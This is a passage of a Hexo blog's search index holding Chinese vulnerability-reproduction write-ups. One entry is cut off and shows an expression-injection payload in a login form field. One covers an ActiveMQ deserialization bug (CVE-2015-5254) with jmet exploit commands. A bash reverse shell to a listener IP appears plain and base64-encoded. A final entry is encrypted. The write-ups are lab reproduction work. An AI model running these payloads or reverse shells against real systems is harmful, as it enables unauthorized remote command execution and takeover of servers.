src="https://i.loli.net/2021/01/02/ecjJT9pd6tDkanM.png"></p><p>接下来执行文件中命令，修改bp中payload为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ username[<span class="comment">#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;bash /tmp/bash.sh&quot;)]=&amp;password=&amp;repeatedPassword=</span></span><br></pre></td></tr></table></figure><p>执行成功，也成功弹回shell</p><p><img src="https://i.loli.net/2021/01/02/WZjIX4ub1QENMK2.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 反弹shell </tag>
+            
+            <tag> 命令执行 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>ActiveMQ反序列化漏洞复现</title>
+      <link href="2020/11/20/ActiveMQ%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+      <url>2020/11/20/ActiveMQ%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+      
+        <content type="html"><![CDATA[<h1 id="ActiveMQ反序列化漏洞（CVE-2015-5254）"><a href="#ActiveMQ反序列化漏洞（CVE-2015-5254）" class="headerlink" title="ActiveMQ反序列化漏洞（CVE-2015-5254）"></a>ActiveMQ反序列化漏洞（CVE-2015-5254）</h1><p>Apache ActiveMQ版本5.x之前的5.13.0安全漏洞，该程序引起的漏洞并不限制可以在代理中序列化的类。远程攻击者可以使特殊的序列化Java消息服务（JMS）ObjectMessage对象利用此漏洞来执行任意代码。</p><p>访问<a href="http://192.168.1.105:8161/">http://192.168.1.105:8161</a></p><h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><h2 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h2><p>将生成序列化的有效负载jmet发送到61616端口，访问web管理页面，点击触发漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y <span class="string">&quot;touch /tmp/success&quot;</span> -Yp ROME 192.168.1.105 61616</span><br></pre></td></tr></table></figure><p>查看事件并点击触发</p><p><img src="https://i.loli.net/2020/12/31/lS26KzN5MwnAY8F.png"></p><p>发现成功在tmp文件下创建success</p><p><img src="https://i.loli.net/2020/12/31/4JLegGk7h3VxcrA.png"></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ bash -i &gt;&amp; /dev/tcp/192.168.1.102/5555 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>base64加密后发送到61616端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAyLzU1NTUgMD4mMQ&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -Yp ROME 192.168.1.105 61616</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/12/31/5bB3OrfpY9EUAjJ.png"></p><p>本地监听5555端口，点击事件触发漏洞<br>成功弹回shell</p><p><img src="https://i.loli.net/2020/12/31/uq67D1XeZBzF5nC.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 反序列化 </tag>
+            
+            <tag> 反弹shell </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Hello World</title>
+      <link href="2020/10/09/hello-world/"/>
+      <url>2020/10/09/hello-world/</url>
+      
+        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="af6bcb762eae4be4ec47a628e053618cd34be227b0787e9cdf025cc42b784a2a">4630436162ade97ba2718b7d0c4b3b630feb3b48bea4a303f664086afc210114fc615933b47ea0ac7d43594df641b32db65df296f48d3818e31a91a9c53fcca0749314e9fd172643baff8f232d9c61d879e983d5615ff28d4c043eb4f7bc405bd8461da7c20c55abc3506d3c77bb3a567f8b76bfde2eb53babc89206b6e44b1d93cf3dab58181e20362451d057cdd3a1e5c726d8e70534d428fe39c848aafa5e57e343caa080befbc9ef3630a56d146efb865b3a49212ad1325b4e8ed3fc33ba71a541dc9548b3cf0fb97b21c9650ff5f10bf624cf38e4b076cd883baa59f08c4086e0b82da396fc782911566f947acf7088df2b86285b34a7f173fd55a6039586b3383404c44d75680f50c6154e60765997f867c24c134b0fff304c5390c0249c9c9757be6fa4436f663fa691bad67bcc869b8deaa5bcaf113c6f4ecbbbec4fefa4b8d5d6da7470122a6e7a271a6f832fff2dff4bfafb921933fee629114cc5c2eb03b313a175ff70e848537818b9f7d628c165e1fc6fa9a7e4990e9f3bf3c306b160fb989c3b54612286477dd21f7757b9254a9912031c02b6264e24c3219dc5407b8662aba98047680b123db085468c29e463621a8cd7e8a3b1f582110611663f7f0c37985d5f5d281a8b5374fa7949550b254d0bb382c00149afba7ba845b7363ba45cad576a91bdf3c265fd481df6ae692355aef06969ef7aea53e32c135ccccdd4a7afe96b8df299af232c37faf1c1ed681a79aca728cbac4186052cc8288a16bd3cfbb25ac1b213e5b3da627df08c53635fd9bf13936ef42c0d982d0e919ab21a1067210e5443aba9464ab96d42e6611d8ba55e0438e211b4be0f425e6b4934c9cd59c7891a7e47fcbf067c90146741ba3ef7ca7c77acee2f7a0d652d920699c44cbcc0402df975c0695cf6b06694b6feca196a218cb58a6eb87a0422eb0d49d5fa9c0fb3ad04cb35ab559d1bb7e84ac8eb42aa05ff9ec93996ea1b928aa2456c0a8f12805883172ab00aab458f1d32becfb8b48d1aa868237ea74e25b87bf537346c8df6a5b17bfa0d6ef9074bb841b03a0ea689c187eed1f04f05c139d08e6ee9593b84f57fbaa13abec07fd36d6b282d8e96841e30c446bd3c23b784debe7930d33b1abfad2ee473eba9a65b868aa534621f104033c0cd7aa859d1e1425ee92a9e94dd0d43db79e0e6281e1f80e4e23bf7b5dfd0ccf83e26b3ff8fc6013e1ed373398085541b1865bc0823cb3cd5393cda76ff3068966cd5b82d8f2319b18688fa30bc49847fe35268b2bc08d5b0e4352c07873dc8e63e3a8b5b7411bffcbe2eea3f19cd160b90b294a11e95bdc98ad3e26993ca70dbdb9c5496a5f70cb920785f205f751685aab08bab31149b7e3c23b68db8a93d39879917713985c0a9478c879fd220f52c018cf6c64dec3f3257f4de2ca7427ec670735cabc85e31dc6d1dd73cf81229f066f9ca774871bd5d96060ff63320dad6a9d93d03fe6305e66b8a57a3027172030beafd236ca4ce742abbcd1de58a250a08f67d0b809a85c0eba9c049ffafb96ee73f392d18b97f8943a8535c162c8c9a69473267263f984cc48bbbd86afd89445c1d16d71d13848cfcb4197da54fa8cf96e91634a1efe22aa8e4b768402e9b0d9d786b04646f7c7e4bed467de3c3e5473d49e5287176c44633924ce2ec8e4e56b821bfedc3e70b7c6df4d23303fc3b66db9047574c04019abff0b9d49178d99f6793d5510e56c4c4ca352bbfdd598260a4e7df120f9c3bd7a315f30ed036867eafcf4455e0eb1bcf0a367f741680a5e91a2924e4a97b8564ce303cbe56fa536b1b8e5605483eb57ba7f9b856b4af8f776cba5b76ebeb3d5bbbfbe58ccf87621e7c58328d7cc66c860ad81df58030a3de38051c95f8ecf61cfa1a50d948904488d415e3f0c2a593b0d4b08ba3240a764de7fb02c1b3fd8fbb5cc30af55ad8df1d05da5fa7ab24ab8f535835bda634f3138871a5547ff7d85a653c8845eb305f77afaf33fa4879d2eb61ed628fd8d4aebb3c6b499f9d3245aa9e16a6b2a12682517c35403fc2becdb1de3e400c9b754a430d78f2b744b08cce985a3c2d1d61d9af4818dfb4b60f4e741b0a83e7711bb31daf11268bb99f0fb4b04867b53b27cb5311f59d1a1361bd3333f959384dda12352b03ec39a3c35cdbb910ba5429990ede657b2e5f31d980987153b0eb98042ebe8c6996ca6dee3c3d0c912f1110216d96d5b6bbbccdb6364eae999b24771f6c88c97b0d9312f7a068dc2b72bea24481d46530ce17062056ce7b571e77dd57f564cbdeea8a5a30b3077852e120852c315c244cf9be4fcd38dc1af5f7f98f916f65520aaac9e9d647aa2d731dd05ab6ff558af9651a7bf507aac4602840f6967468ce49601e5ec52ab7e2020dd60934d8f7529de7d6f7b35047cb19b62f8347facbed938f53c1ed13c2d6a4e58ad99e2aa0ec29e9465d7ca2bc695113fe3898136a4a2c9913f5b4e26c7c52f007a49f2bcadb8f2d30a4304888ce7eeb300dc96f853137cef19f3e6cd11906a8a8e039e0a7ada2be10d9</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+      
+      
+      <categories>
+          
+          <category> 学习记录 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+  
+  
+</search>
